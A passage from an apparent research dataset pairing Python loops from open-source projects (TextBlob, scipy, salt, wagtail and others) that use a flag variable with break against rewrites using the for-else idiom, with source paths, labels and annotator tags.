            ""clearing any existing image record in policy engine: {} / {} / {}"".format(
                account, image_id, image_digest
            )
        )
        rc = pe_client.delete_image(user_id=account, image_id=image_id)
    except Exception as err:
        logger.warn(""exception on pre-delete - exception: "" + str(err))

    client_success = False
    last_exception = None

    # TODO: rework this wait logic using 'retrying.retry()' decorator on this whole function to allow new client on each call
    for retry_wait in [1, 3, 5, 0]:
        try:
            logger.info(
                ""loading image into policy engine: account={} image_id={} image_digest={}"".format(
                    account, image_id, image_digest
                )
            )
            image_analysis_fetch_url = build_catalog_url(account, image_digest)
            logger.debug(
                ""policy engine request catalog content url: "" + image_analysis_fetch_url
            )
            resp = pe_client.ingress_image(account, image_id, image_analysis_fetch_url)
            logger.debug(""policy engine image add response: "" + str(resp))
            client_success = True
            break
            # TODO: add a vuln eval and policy eval (with active policy), here to prime any caches since this isn't a highly latency sensitive code section
        except Exception as e:
            logger.warn(""attempt failed, will retry - exception: {}"".format(e))
            last_exception = e
            time.sleep(retry_wait)

    if not client_success:
        raise last_exception

    return True","for retry_wait in [1, 3, 5, 0]:
    try:
        logger.info('loading image into policy engine: account={} image_id={} image_digest={}'.format(account, image_id, image_digest))
        image_analysis_fetch_url = build_catalog_url(account, image_digest)
        logger.debug('policy engine request catalog content url: ' + image_analysis_fetch_url)
        resp = pe_client.ingress_image(account, image_id, image_analysis_fetch_url)
        logger.debug('policy engine image add response: ' + str(resp))
        client_success = True
        break
    except Exception as e:
        logger.warn('attempt failed, will retry - exception: {}'.format(e))
        last_exception = e
        time.sleep(retry_wait)
if not client_success:
    raise last_exception","for retry_wait in [1, 3, 5, 0]:
    try:
        logger.info('loading image into policy engine: account={} image_id={} image_digest={}'.format(account, image_id, image_digest))
        image_analysis_fetch_url = build_catalog_url(account, image_digest)
        logger.debug('policy engine request catalog content url: ' + image_analysis_fetch_url)
        resp = pe_client.ingress_image(account, image_id, image_analysis_fetch_url)
        logger.debug('policy engine image add response: ' + str(resp))
        break
    except Exception as e:
        logger.warn('attempt failed, will retry - exception: {}'.format(e))
        last_exception = e
        time.sleep(retry_wait)
else:
    raise last_exception","for retry_wait in [1, 3, 5, 0]:
    try:
        logger.info('loading image into policy engine: account={} image_id={} image_digest={}'.format(account, image_id, image_digest))
        image_analysis_fetch_url = build_catalog_url(account, image_digest)
        logger.debug('policy engine request catalog content url: ' + image_analysis_fetch_url)
        resp = pe_client.ingress_image(account, image_id, image_analysis_fetch_url)
        logger.debug('policy engine image add response: ' + str(resp))
        break
    except Exception as e:
        logger.warn('attempt failed, will retry - exception: {}'.format(e))
        last_exception = e
        time.sleep(retry_wait)
else:
    raise last_exception",1,"for retry_wait in [1, 3, 5, 0]:
    try:
        logger.info('loading image into policy engine: account={} image_id={} image_digest={}'.format(account, image_id, image_digest))
        image_analysis_fetch_url = build_catalog_url(account, image_digest)
        logger.debug('policy engine request catalog content url: ' + image_analysis_fetch_url)
        resp = pe_client.ingress_image(account, image_id, image_analysis_fetch_url)
        logger.debug('policy engine image add response: ' + str(resp))
        client_success = True
        break
    except Exception as e:
        logger.warn('attempt failed, will retry - exception: {}'.format(e))
        last_exception = e
        time.sleep(retry_wait)
if not client_success:
    raise last_exception","break statement is executed:None
break statement is not executed:zejun1"
TextBlob,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/TextBlob/textblob/utils.py,https://github.com/sloria/TextBlob/tree/master/textblob/utils.py,,filter_insignificant$40,"def filter_insignificant(chunk, tag_suffixes=('DT', 'CC', 'PRP$', 'PRP')):
    """"""Filter out insignificant (word, tag) tuples from a chunk of text.""""""
    good = []
    for word, tag in chunk:
        ok = True
        for suffix in tag_suffixes:
            if tag.endswith(suffix):
                ok = False
                break
        if ok:
            good.append((word, tag))
    return good","for suffix in tag_suffixes:
    if tag.endswith(suffix):
        ok = False
        break
if ok:
    good.append((word, tag))","for suffix in tag_suffixes:
    if tag.endswith(suffix):
        break
else:
    good.append((word, tag))","for suffix in tag_suffixes:
    if tag.endswith(suffix):
        break
else:
    good.append((word, tag))",1,"for suffix in tag_suffixes:
    if tag.endswith(suffix):
        ok = False
        break
if ok:
    good.append((word, tag))","break statement is executed:None
break statement is not executed:zejun1"
pyopencl,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyopencl/pyopencl/cache.py,https://github.com/inducer/pyopencl/tree/master/pyopencl/cache.py,,_inner$172,"def _inner(src):
        for match in C_INCLUDE_RE.finditer(src):
            included = match.group(1)

            found = False
            for ipath in include_path:
                included_file_name = realpath(join(ipath, included))

                if included_file_name not in result:
                    try:
                        src_file = open(included_file_name)
                    except OSError:
                        continue

                    try:
                        included_src = src_file.read()
                    finally:
                        src_file.close()

                    # jrevent infinite recursion if some header file appears to
                    # include itself
                    result[included_file_name] = None

                    checksum = new_hash()
                    update_checksum(checksum, included_src)
                    _inner(included_src)

                    result[included_file_name] = (
                            os.stat(included_file_name).st_mtime,
                            checksum.hexdigest(),
                            )

                    found = True
                    break  # stop searching the include path

            if not found:
                pass","for ipath in include_path:
    included_file_name = realpath(join(ipath, included))
    if included_file_name not in result:
        try:
            src_file = open(included_file_name)
        except OSError:
            continue
        try:
            included_src = src_file.read()
        finally:
            src_file.close()
        result[included_file_name] = None
        checksum = new_hash()
        update_checksum(checksum, included_src)
        _inner(included_src)
        result[included_file_name] = (os.stat(included_file_name).st_mtime, checksum.hexdigest())
        found = True
        break
if not found:
    pass","for ipath in include_path:
    included_file_name = realpath(join(ipath, included))
    if included_file_name not in result:
        try:
            src_file = open(included_file_name)
        except OSError:
            continue
        try:
            included_src = src_file.read()
        finally:
            src_file.close()
        result[included_file_name] = None
        checksum = new_hash()
        update_checksum(checksum, included_src)
        _inner(included_src)
        result[included_file_name] = (os.stat(included_file_name).st_mtime, checksum.hexdigest())
        break
else:
    pass","for ipath in include_path:
    included_file_name = realpath(join(ipath, included))
    if included_file_name not in result:
        try:
            src_file = open(included_file_name)
        except OSError:
            continue
        try:
            included_src = src_file.read()
        finally:
            src_file.close()
        result[included_file_name] = None
        checksum = new_hash()
        update_checksum(checksum, included_src)
        _inner(included_src)
        result[included_file_name] = (os.stat(included_file_name).st_mtime, checksum.hexdigest())
        break
else:
    pass",1,"for ipath in include_path:
    included_file_name = realpath(join(ipath, included))
    if included_file_name not in result:
        try:
            src_file = open(included_file_name)
        except OSError:
            continue
        try:
            included_src = src_file.read()
        finally:
            src_file.close()
        result[included_file_name] = None
        checksum = new_hash()
        update_checksum(checksum, included_src)
        _inner(included_src)
        result[included_file_name] = (os.stat(included_file_name).st_mtime, checksum.hexdigest())
        found = True
        break
if not found:
    pass","break statement is executed:None
break statement is not executed:zejun1"
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/salt/modules/helm.py,https://github.com/saltstack/salt/tree/master/salt/modules/helm.py,,repo_manage$986,"def repo_manage(
    present=None, absent=None, prune=False, namespace=None, flags=None, kvflags=None
):
    """"""
    Manage charts repository.
    Return the summery of all actions.

    present
        (list) List of repository to be present. It's a list of dict: [{'name': 'local_name', 'url': 'repository_url'}]

    absent
        (list) List of local name repository to be absent.

    prune
        (boolean - default: False) If True, all repository already present but not in the present list would be removed.

    namespace
        (string) The namespace scope for this request.

    flags
        (list) Flags in argument of the command without values. ex: ['help', '--help']

    kvflags
        (dict) Flags in argument of the command with values. ex: {'v': 2, '--v': 4}

    CLI Example:

    .. code-block:: bash

        salt '*' helm.repo_manage present=""[{'name': 'LOCAL_NAME', 'url': 'REPO_URL'}]"" absent=""['LOCAL_NAME']""

    """"""
    if present is None:
        present = []
    else:
        present = copy.deepcopy(present)
    if absent is None:
        absent = []
    else:
        absent = copy.deepcopy(absent)
    if namespace:
        if kvflags:
            kvflags.update({""namespace"": namespace})
        else:
            kvflags = {""namespace"": namespace}

    repos_present = repo_list(namespace=namespace, flags=flags, kvflags=kvflags)
    if not isinstance(repos_present, list):
        repos_present = []
    result = {""present"": [], ""added"": [], ""absent"": [], ""removed"": [], ""failed"": []}

    for repo in present:
        if not (
            isinstance(repo, dict) and ""name"" in repo.keys() and ""url"" in repo.keys()
        ):
            raise CommandExecutionError(
                ""Parameter present have to be formatted like ""
                ""[{'name': '<myRepoName>', 'url': '<myRepoUrl>'}]""
            )

        already_present = False
        for (index, repo_present) in enumerate(repos_present):
            if repo.get(""name"") == repo_present.get(""name"") and repo.get(
                ""url""
            ) == repo_present.get(""url""):
                result[""present""].append(repo)
                repos_present.pop(index)
                already_present = True
                break

        if not already_present:
            repo_add_status = repo_add(
                repo.get(""name""),
                repo.get(""url""),
                namespace=namespace,
                flags=flags,
                kvflags=kvflags,
            )
            if isinstance(repo_add_status, bool) and repo_add_status:
                result[""added""].append(repo)
            else:
                result[""failed""].append(repo)

    for repo in repos_present:
        if prune:
            absent.append(repo.get(""name""))
        elif not repo.get(""name"") in absent:
            result[""present""].append(repo)

    for name in absent:
        remove_status = repo_remove(name, namespace=namespace)
        if isinstance(remove_status, bool) and remove_status:
            result[""removed""].append(name)
        else:
            result[""absent""].append(name)

    return result","for (index, repo_present) in enumerate(repos_present):
    if repo.get('name') == repo_present.get('name') and repo.get('url') == repo_present.get('url'):
        result['present'].append(repo)
        repos_present.pop(index)
        already_present = True
        break
if not already_present:
    repo_add_status = repo_add(repo.get('name'), repo.get('url'), namespace=namespace, flags=flags, kvflags=kvflags)
    if isinstance(repo_add_status, bool) and repo_add_status:
        result['added'].append(repo)
    else:
        result['failed'].append(repo)","for (index, repo_present) in enumerate(repos_present):
    if repo.get('name') == repo_present.get('name') and repo.get('url') == repo_present.get('url'):
        result['present'].append(repo)
        repos_present.pop(index)
        break
else:
    repo_add_status = repo_add(repo.get('name'), repo.get('url'), namespace=namespace, flags=flags, kvflags=kvflags)
    if isinstance(repo_add_status, bool) and repo_add_status:
        result['added'].append(repo)
    else:
        result['failed'].append(repo)","for (index, repo_present) in enumerate(repos_present):
    if repo.get('name') == repo_present.get('name') and repo.get('url') == repo_present.get('url'):
        result['present'].append(repo)
        repos_present.pop(index)
        break
else:
    repo_add_status = repo_add(repo.get('name'), repo.get('url'), namespace=namespace, flags=flags, kvflags=kvflags)
    if isinstance(repo_add_status, bool) and repo_add_status:
        result['added'].append(repo)
    else:
        result['failed'].append(repo)",1,"for (index, repo_present) in enumerate(repos_present):
    if repo.get('name') == repo_present.get('name') and repo.get('url') == repo_present.get('url'):
        result['present'].append(repo)
        repos_present.pop(index)
        already_present = True
        break
if not already_present:
    repo_add_status = repo_add(repo.get('name'), repo.get('url'), namespace=namespace, flags=flags, kvflags=kvflags)
    if isinstance(repo_add_status, bool) and repo_add_status:
        result['added'].append(repo)
    else:
        result['failed'].append(repo)","break statement is executed:None
break statement is not executed:zejun1"
scipy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/scipy/scipy/optimize/_group_columns.py,https://github.com/scipy/scipy/tree/master/scipy/optimize/_group_columns.py,,group_dense$10,"def group_dense(m, n, A):
    B = A.T  # Transposed view for convenience.

    # FIXME: use np.full once pythran supports it
    groups = -np.ones(n, dtype=np.intp)
    current_group = 0

    union = np.empty(m, dtype=np.intp)

    # Loop through all the columns.
    for i in range(n):
        if groups[i] >= 0:  # A group was already assigned.
            continue

        groups[i] = current_group
        all_grouped = True

        union[:] = B[i]  # Here we store the union of grouped columns.

        for j in range(groups.shape[0]):
            if groups[j] < 0:
                all_grouped = False
            else:
                continue

            # Determine if j-th column intersects with the union.
            intersect = False
            for k in range(m):
                if union[k] > 0 and B[j, k] > 0:
                    intersect = True
                    break

            # If not, add it to the union and assign the group to it.
            if not intersect:
                union += B[j]
                groups[j] = current_group

        if all_grouped:
            break

        current_group += 1

    return groups","for k in range(m):
    if union[k] > 0 and B[j, k] > 0:
        intersect = True
        break
if not intersect:
    union += B[j]
    groups[j] = current_group","for k in range(m):
    if union[k] > 0 and B[j, k] > 0:
        break
else:
    union += B[j]
    groups[j] = current_group","for k in range(m):
    if union[k] > 0 and B[j, k] > 0:
        break
else:
    union += B[j]
    groups[j] = current_group",1,"for k in range(m):
    if union[k] > 0 and B[j, k] > 0:
        intersect = True
        break
if not intersect:
    union += B[j]
    groups[j] = current_group","break statement is executed:None
break statement is not executed:zejun1"
chia-rosechain,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/chia-rosechain/chia/full_node/full_node_store.py,https://github.com/snight1983/chia-rosechain/tree/master/chia/full_node/full_node_store.py,FullNodeStore,get_finished_sub_slots$748,"def get_finished_sub_slots(
        self,
        block_records: BlockchainInterface,
        prev_b: Optional[BlockRecord],
        last_challenge_to_add: bytes32,
    ) -> Optional[List[EndOfSubSlotBundle]]:
        """"""
        Retrieves the EndOfSubSlotBundles that are in the store either:
        1. From the starting challenge if prev_b is None
        2. That are not included in the blockchain with peak of prev_b if prev_b is not None

        Stops at last_challenge
        """"""

        if prev_b is None:
            # The first sub slot must be None
            assert self.finished_sub_slots[0][0] is None
            challenge_in_chain: bytes32 = self.constants.GENESIS_CHALLENGE
        else:
            curr: BlockRecord = prev_b
            while not curr.first_in_sub_slot:
                curr = block_records.block_record(curr.prev_hash)
            assert curr is not None
            assert curr.finished_challenge_slot_hashes is not None
            challenge_in_chain = curr.finished_challenge_slot_hashes[-1]

        if last_challenge_to_add == challenge_in_chain:
            # No additional slots to add
            return []

        collected_sub_slots: List[EndOfSubSlotBundle] = []
        found_last_challenge = False
        found_connecting_challenge = False
        for sub_slot, sps, total_iters in self.finished_sub_slots[1:]:
            assert sub_slot is not None
            if sub_slot.challenge_chain.challenge_chain_end_of_slot_vdf.challenge == challenge_in_chain:
                found_connecting_challenge = True
            if found_connecting_challenge:
                collected_sub_slots.append(sub_slot)
            if found_connecting_challenge and sub_slot.challenge_chain.get_hash() == last_challenge_to_add:
                found_last_challenge = True
                break
        if not found_last_challenge:
            log.warning(f""Did not find hash {last_challenge_to_add} connected to "" f""{challenge_in_chain}"")
            return None
        return collected_sub_slots","for (sub_slot, sps, total_iters) in self.finished_sub_slots[1:]:
    assert sub_slot is not None
    if sub_slot.challenge_chain.challenge_chain_end_of_slot_vdf.challenge == challenge_in_chain:
        found_connecting_challenge = True
    if found_connecting_challenge:
        collected_sub_slots.append(sub_slot)
    if found_connecting_challenge and sub_slot.challenge_chain.get_hash() == last_challenge_to_add:
        found_last_challenge = True
        break
if not found_last_challenge:
    log.warning(f'Did not find hash {last_challenge_to_add} connected to {challenge_in_chain}')
    return None","for (sub_slot, sps, total_iters) in self.finished_sub_slots[1:]:
    assert sub_slot is not None
    if sub_slot.challenge_chain.challenge_chain_end_of_slot_vdf.challenge == challenge_in_chain:
        found_connecting_challenge = True
    if found_connecting_challenge:
        collected_sub_slots.append(sub_slot)
    if found_connecting_challenge and sub_slot.challenge_chain.get_hash() == last_challenge_to_add:
        break
else:
    log.warning(f'Did not find hash {last_challenge_to_add} connected to {challenge_in_chain}')
    return None","for (sub_slot, sps, total_iters) in self.finished_sub_slots[1:]:
    assert sub_slot is not None
    if sub_slot.challenge_chain.challenge_chain_end_of_slot_vdf.challenge == challenge_in_chain:
        found_connecting_challenge = True
    if found_connecting_challenge:
        collected_sub_slots.append(sub_slot)
    if found_connecting_challenge and sub_slot.challenge_chain.get_hash() == last_challenge_to_add:
        break
else:
    log.warning(f'Did not find hash {last_challenge_to_add} connected to {challenge_in_chain}')
    return None",1,"for (sub_slot, sps, total_iters) in self.finished_sub_slots[1:]:
    assert sub_slot is not None
    if sub_slot.challenge_chain.challenge_chain_end_of_slot_vdf.challenge == challenge_in_chain:
        found_connecting_challenge = True
    if found_connecting_challenge:
        collected_sub_slots.append(sub_slot)
    if found_connecting_challenge and sub_slot.challenge_chain.get_hash() == last_challenge_to_add:
        found_last_challenge = True
        break
if not found_last_challenge:
    log.warning(f'Did not find hash {last_challenge_to_add} connected to {challenge_in_chain}')
    return None","break statement is executed:None
break statement is not executed:zejun1"
neutron,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/neutron/neutron/hacking/checks.py,https://github.com/openstack/neutron/tree/master/neutron/hacking/checks.py,,check_builtins_gettext$160,"def check_builtins_gettext(logical_line, tokens, filename, lines, noqa):
    """"""N341 - Check usage of builtins gettext _().""""""

    if noqa:
        return

    modulename = os.path.normpath(filename).split('/')[0]

    if '%s/tests' % modulename in filename:
        return

    if os.path.basename(filename) in ('i18n.py', '_i18n.py'):
        return

    token_values = [t[1] for t in tokens]
    i18n_wrapper = '%s._i18n' % modulename

    if '_' in token_values:
        i18n_import_line_found = False
        for line in lines:
            split_line = [elm.rstrip(',') for elm in line.split()]
            if (len(split_line) > 1 and split_line[0] == 'from' and
                    split_line[1] == i18n_wrapper and
                    '_' in split_line):
                i18n_import_line_found = True
                break
        if not i18n_import_line_found:
            msg = (""N341: _ from python builtins module is used. ""
                   ""Use _ from %s instead."" % i18n_wrapper)
            yield (0, msg)","for line in lines:
    split_line = [elm.rstrip(',') for elm in line.split()]
    if len(split_line) > 1 and split_line[0] == 'from' and (split_line[1] == i18n_wrapper) and ('_' in split_line):
        i18n_import_line_found = True
        break
if not i18n_import_line_found:
    msg = 'N341: _ from python builtins module is used. Use _ from %s instead.' % i18n_wrapper
    yield (0, msg)","for line in lines:
    split_line = [elm.rstrip(',') for elm in line.split()]
    if len(split_line) > 1 and split_line[0] == 'from' and (split_line[1] == i18n_wrapper) and ('_' in split_line):
        break
else:
    msg = 'N341: _ from python builtins module is used. Use _ from %s instead.' % i18n_wrapper
    yield (0, msg)","for line in lines:
    split_line = [elm.rstrip(',') for elm in line.split()]
    if len(split_line) > 1 and split_line[0] == 'from' and (split_line[1] == i18n_wrapper) and ('_' in split_line):
        break
else:
    msg = 'N341: _ from python builtins module is used. Use _ from %s instead.' % i18n_wrapper
    yield (0, msg)",1,"for line in lines:
    split_line = [elm.rstrip(',') for elm in line.split()]
    if len(split_line) > 1 and split_line[0] == 'from' and (split_line[1] == i18n_wrapper) and ('_' in split_line):
        i18n_import_line_found = True
        break
if not i18n_import_line_found:
    msg = 'N341: _ from python builtins module is used. Use _ from %s instead.' % i18n_wrapper
    yield (0, msg)","break statement is executed:None
break statement is not executed:zejun1"
holoviews,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/holoviews/holoviews/plotting/plot.py,https://github.com/holoviz/holoviews/tree/master/holoviews/plotting/plot.py,GenericOverlayPlot,_get_subplot_extents$1768,"def _get_subplot_extents(self, overlay, ranges, range_type):
        """"""
        Iterates over all subplots and collects the extents of each.
        """"""
        if range_type == 'combined':
            extents = {'extents': [], 'soft': [], 'hard': [], 'data': []}
        else:
            extents = {range_type: []}
        items = overlay.items()
        if self.batched and self.subplots:
            subplot = list(self.subplots.values())[0]
            subplots = [(k, subplot) for k in overlay.data.keys()]
        else:
            subplots = self.subplots.items()

        for key, subplot in subplots:
            found = False
            if subplot is None:
                continue
            layer = overlay.data.get(key, None)
            if isinstance(self.hmap, DynamicMap) and layer is None:
                for _, layer in items:
                    if isinstance(layer, subplot.hmap.type):
                        found = True
                        break
                if not found:
                    layer = None
            if layer is None or not subplot.apply_ranges:
                continue

            if isinstance(layer, CompositeOverlay):
                sp_ranges = ranges
            else:
                sp_ranges = util.match_spec(layer, ranges) if ranges else {}
            for rt in extents:
                extent = subplot.get_extents(layer, sp_ranges, range_type=rt)
                extents[rt].append(extent)
        return extents","for (_, layer) in items:
    if isinstance(layer, subplot.hmap.type):
        found = True
        break
if not found:
    layer = None","for (_, layer) in items:
    if isinstance(layer, subplot.hmap.type):
        break
else:
    layer = None","for (_, layer) in items:
    if isinstance(layer, subplot.hmap.type):
        break
else:
    layer = None",1,"for (_, layer) in items:
    if isinstance(layer, subplot.hmap.type):
        found = True
        break
if not found:
    layer = None","break statement is executed:None
break statement is not executed:zejun1"
tangent,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tangent/tangent/forward_ad.py,https://github.com/google/tangent/tree/master/tangent/forward_ad.py,ForwardAD,visit_Call$231,"def visit_Call(self, node):
    if not self.target:
      return node
    func = anno.getanno(node, 'func')

    if func in tangents.UNIMPLEMENTED_TANGENTS:
      raise errors.ForwardNotImplementedError(func)

    if func == tracing.Traceable:
      raise NotImplementedError('Tracing of %s is not enabled in forward mode' %
                                quoting.unquote(node))

    if func not in tangents.tangents:
      try:
        quoting.parse_function(func)
      except:
        raise ValueError('No tangent found for %s, and could not get source.' %
                         func.__name__)

      # z = f(x,y) -> d[z],z = df(x,y,dx=dx,dy=dy)
      active_args = tuple(i for i, arg in enumerate(node.args)
                          if isinstance(arg, gast.Name))
      # TODO: Stack arguments are currently not considered
      # active, but for forward-mode applied to call trees,
      # they have to be. When we figure out how to update activity
      # analysis to do the right thing, we'll want to add the extra check:
      # `and arg.id in self.active_variables`

      # TODO: Duplicate of code in reverse_ad.
      already_counted = False
      for f, a in self.required:
        if f.__name__ == func.__name__ and set(a) == set(active_args):
          already_counted = True
          break
      if not already_counted:
        self.required.append((func, active_args))

      fn_name = naming.tangent_name(func, active_args)
      orig_args = quoting.parse_function(func).body[0].args
      tangent_keywords = []
      for i in active_args:
        grad_node = create.create_grad(node.args[i], self.namer, tangent=True)
        arg_grad_node = create.create_grad(
            orig_args.args[i], self.namer, tangent=True)
        grad_node.ctx = gast.Load()
        tangent_keywords.append(
            gast.keyword(arg=arg_grad_node.id, value=grad_node))
      # Update the original call
      rhs = gast.Call(
          func=gast.Name(id=fn_name, ctx=gast.Load(), annotation=None),
          args=node.args,
          keywords=tangent_keywords + node.keywords)
      # Set self.value to False to trigger whole primal replacement
      self.value = False
      return [rhs]

    template_ = tangents.tangents[func]

    # Match the function call to the template
    sig = funcsigs.signature(template_)
    sig = sig.replace(parameters=list(sig.parameters.values())[1:])
    kwargs = dict((keyword.arg, keyword.value) for keyword in node.keywords)
    bound_args = sig.bind(*node.args, **kwargs)

    # Fill in any missing kwargs with the defaults from the template
    args = quoting.parse_function(template_).body[0].args
    kwargs = dict(zip(*map(reversed, [args.args, args.defaults])))
    kwargs.update(dict(zip(args.kwonlyargs, args.kw_defaults)))
    for arg, val in kwargs.items():
      if arg.id not in bound_args.arguments:
        bound_args.arguments[arg.id] = val

    # Let's fill in the template. The first argument is the output, which
    # was stored in a temporary variable
    output_name = six.get_function_code(template_).co_varnames[0]
    arg_replacements = {output_name: self.tmp_node}
    arg_replacements.update(bound_args.arguments)

    # If the template uses *args, then we pack the corresponding inputs
    flags = six.get_function_code(template_).co_flags

    if flags & inspect.CO_VARARGS:
      to_pack = node.args[six.get_function_code(template_).co_argcount - 1:]
      vararg_name = six.get_function_code(template_).co_varnames[-1]
      target = gast.Name(annotation=None, id=vararg_name, ctx=gast.Store())
      value = gast.Tuple(elts=to_pack, ctx=gast.Load())

      # And we fill in the packed tuple into the template
      arg_replacements[six.get_function_code(template_).co_varnames[
          -1]] = target
    tangent_node = template.replace(
        template_,
        replace_grad=template.Replace.TANGENT,
        namer=self.namer,
        **arg_replacements)

    # If the template uses the answer in the RHS of the tangent,
    # we need to make sure that the regular answer is replaced
    # with self.tmp_node, but that the gradient is not. We have
    # to be extra careful for statements like a = exp(a), because
    # both the target and RHS variables have the same name.
    tmp_grad_node = create.create_grad(self.tmp_node, self.namer, tangent=True)
    tmp_grad_name = tmp_grad_node.id
    ans_grad_node = create.create_grad(self.target, self.namer, tangent=True)
    for _node in tangent_node:
      for succ in gast.walk(_node):
        if isinstance(succ, gast.Name) and succ.id == tmp_grad_name:
          succ.id = ans_grad_node.id

    if flags & inspect.CO_VARARGS:
      # If the template packs arguments, then we have to unpack the
      # derivatives afterwards
      # We also have to update the replacements tuple then
      dto_pack = [
          create.create_temp_grad(arg, self.namer, True) for arg in to_pack
      ]
      value = create.create_grad(target, self.namer, tangent=True)
      target = gast.Tuple(elts=dto_pack, ctx=gast.Store())

    # Stack pops have to be special-cased, we have
    # to set the 'push' attribute, so we know that if we
    # remove this pop, we have to remove the equivalent push.
    # NOTE: this only works if we're doing forward-over-reverse,
    # where reverse is applied in joint mode, with no call tree.
    # Otherwise, the pushes and pops won't be matched within a single
    # function call.
    if func == tangent.pop:
      if len(self.metastack):
        anno.setanno(tangent_node[0], 'push', self.metastack.pop())
      else:
        anno.setanno(tangent_node[0], 'push', None)
    return tangent_node","for (f, a) in self.required:
    if f.__name__ == func.__name__ and set(a) == set(active_args):
        already_counted = True
        break
if not already_counted:
    self.required.append((func, active_args))","for (f, a) in self.required:
    if f.__name__ == func.__name__ and set(a) == set(active_args):
        break
else:
    self.required.append((func, active_args))","for (f, a) in self.required:
    if f.__name__ == func.__name__ and set(a) == set(active_args):
        break
else:
    self.required.append((func, active_args))",1,"for (f, a) in self.required:
    if f.__name__ == func.__name__ and set(a) == set(active_args):
        already_counted = True
        break
if not already_counted:
    self.required.append((func, active_args))","break statement is executed:None
break statement is not executed:zejun1"
wagtail,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/wagtail/wagtail/core/blocks/field_block.py,https://github.com/wagtail/wagtail/tree/master/wagtail/core/blocks/field_block.py,BaseChoiceBlock,_get_callable_choices$446,"def _get_callable_choices(self, choices, blank_choice=True):
        """"""
        Return a callable that we can pass into `forms.ChoiceField`, which will provide the
        choices list with the addition of a blank choice (if blank_choice=True and one does not
        already exist).
        """"""
        def choices_callable():
            # Variable choices could be an instance of CallableChoiceIterator, which may be wrapping
            # something we don't want to evaluate multiple times (e.g. a database query). Cast as a
            # list now to prevent it getting evaluated twice (once while searching for a blank choice,
            # once while rendering the final ChoiceField).
            local_choices = list(choices)

            # If blank_choice=False has been specified, return the choices list as is
            if not blank_choice:
                return local_choices

            # Else: if choices does not already contain a blank option, insert one
            # (to match Django's own behaviour for modelfields:
            # https://github.com/django/django/blob/1.7.5/django/db/models/fields/__init__.py#L732-744)
            has_blank_choice = False
            for v1, v2 in local_choices:
                if isinstance(v2, (list, tuple)):
                    # this is a named group, and v2 is the value list
                    has_blank_choice = any([value in ('', None) for value, label in v2])
                    if has_blank_choice:
                        break
                else:
                    # this is an individual choice; v1 is the value
                    if v1 in ('', None):
                        has_blank_choice = True
                        break

            if not has_blank_choice:
                return BLANK_CHOICE_DASH + local_choices

            return local_choices
        return choices_callable","for (v1, v2) in local_choices:
    if isinstance(v2, (list, tuple)):
        has_blank_choice = any([value in ('', None) for (value, label) in v2])
        if has_blank_choice:
            break
    elif v1 in ('', None):
        has_blank_choice = True
        break
if not has_blank_choice:
    return BLANK_CHOICE_DASH + local_choices","for (v1, v2) in local_choices:
    if isinstance(v2, (list, tuple)):
        has_blank_choice = any([value in ('', None) for (value, label) in v2])
        if has_blank_choice:
            break
    elif v1 in ('', None):
        has_blank_choice = True
        break
else:
    return BLANK_CHOICE_DASH + local_choices","for (v1, v2) in local_choices:
    if isinstance(v2, (list, tuple)):
        has_blank_choice = any([value in ('', None) for (value, label) in v2])
        if has_blank_choice:
            break
    elif v1 in ('', None):
        has_blank_choice = True
        break
else:
    return BLANK_CHOICE_DASH + local_choices",1,"for (v1, v2) in local_choices:
    if isinstance(v2, (list, tuple)):
        has_blank_choice = any([value in ('', None) for (value, label) in v2])
        if has_blank_choice:
            break
    elif v1 in ('', None):
        has_blank_choice = True
        break
if not has_blank_choice:
    return BLANK_CHOICE_DASH + local_choices","break statement is executed:None
break statement is not executed:zejun1"
TextBlob,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/TextBlob/textblob/_text.py,https://github.com/sloria/TextBlob/tree/master/textblob/_text.py,Entities,apply$620,"def apply(self, tokens):
        """""" Applies the named entity recognizer to the given list of tokens,
            where each token is a [word, tag] list.
        """"""
        # Note: we could also scan for patterns, e.g.,
        # ""my|his|her name is|was *"" => NNP-PERS.
        i = 0
        while i < len(tokens):
            w = tokens[i][0].lower()
            if RE_ENTITY1.match(w) \
            or RE_ENTITY2.match(w) \
            or RE_ENTITY3.match(w):
                tokens[i][1] = self.tag
            if w in self:
                for e in self[w]:
                    # Look ahead to see if successive words match the named entity.
                    e, tag = (e[:-1], ""-""+e[-1].upper()) if e[-1] in self.cmd else (e, """")
                    b = True
                    for j, e in enumerate(e):
                        if i + j >= len(tokens) or tokens[i+j][0].lower() != e:
                            b = False; break
                    if b:
                        for token in tokens[i:i+j+1]:
                            token[1] = (token[1] == ""NNPS"" and token[1] or self.tag) + tag
                        i += j
                        break
            i += 1
        return tokens","for (j, e) in enumerate(e):
    if i + j >= len(tokens) or tokens[i + j][0].lower() != e:
        b = False
        break
if b:
    for token in tokens[i:i + j + 1]:
        token[1] = (token[1] == 'NNPS' and token[1] or self.tag) + tag
    i += j
    break","for (j, e) in enumerate(e):
    if i + j >= len(tokens) or tokens[i + j][0].lower() != e:
        break
else:
    for token in tokens[i:i + j + 1]:
        token[1] = (token[1] == 'NNPS' and token[1] or self.tag) + tag
    i += j
    break","for (j, e) in enumerate(e):
    if i + j >= len(tokens) or tokens[i + j][0].lower() != e:
        break
else:
    for token in tokens[i:i + j + 1]:
        token[1] = (token[1] == 'NNPS' and token[1] or self.tag) + tag
    i += j
    break",1,"for (j, e) in enumerate(e):
    if i + j >= len(tokens) or tokens[i + j][0].lower() != e:
        b = False
        break
if b:
    for token in tokens[i:i + j + 1]:
        token[1] = (token[1] == 'NNPS' and token[1] or self.tag) + tag
    i += j
    break","break statement is executed:None
break statement is not executed:zejun1"
retopoflow,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/retopoflow/addon_common/common/updater_core.py,https://github.com/CGCookie/retopoflow/tree/master/addon_common/common/updater_core.py,SingletonUpdater,deep_merge_directory$997,"def deep_merge_directory(self, base, merger, clean=False):
        """"""Merge folder 'merger' into 'base' without deleting existing""""""
        if not os.path.exists(base):
            self.print_verbose(""Base path does not exist:"" + str(base))
            return -1
        elif not os.path.exists(merger):
            self.print_verbose(""Merger path does not exist"")
            return -1

